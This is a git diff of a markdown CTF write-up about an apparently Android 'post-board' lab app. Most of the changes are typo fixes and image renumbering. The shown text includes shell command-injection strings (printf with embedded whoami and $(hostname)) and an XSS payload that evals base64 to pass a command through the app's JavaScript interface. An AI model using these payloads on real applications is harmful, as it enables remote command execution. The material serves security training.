@@ -136,7 +136,7 @@ private final void handleIntent() {
 }
 ```
 
-Based on the comments in the code above, we can already see the img of how this application handles the user input.
+Based on the comments in the code above, we can already see the imgage of how this application handles the user input.
 
 # Code Flow
 
@@ -232,16 +232,19 @@ We can copy this line: `printf "< %s >\n"` and try escape inside our bash.
 
 Any of those bash scape can work:
 
-- `printf "< %s >\n" "`whoami`"`
-- `printf "< %s >\n" "$(hostname)"`
+```
+printf "< %s >\n" "`whoami`"
 
-![img10.png](/assets/images/ctf-mhl/post-board-lab/img10.png)
+printf "< %s >\n" "$(hostname)"
+```
+
+![img9.png](/assets/images/ctf-mhl/post-board-lab/img9.png)
 
 ```bash
 <img/src='1'/onerror=eval(atob("d2luZG93LldlYkFwcEludGVyZmFjZS5wb3N0Q293c2F5TWVzc2FnZSgiJChob3N0bmFtZSkiKQ=="))>
 ```
 
-![img11.png](/assets/images/ctf-mhl/post-board-lab/img.png)
+![img10.png](/assets/images/ctf-mhl/post-board-lab/img10.png)
 
 # Exploiting
 
@@ -271,7 +274,7 @@ if __name__ == "__main__":
 
 With all that, we pwned the application.
 
-![img1.png](/assets/images/ctf-mhl/post-board-lab/img10.png)
+![img11.png](/assets/images/ctf-mhl/post-board-lab/img11.png)
 
 # Conclusion
 
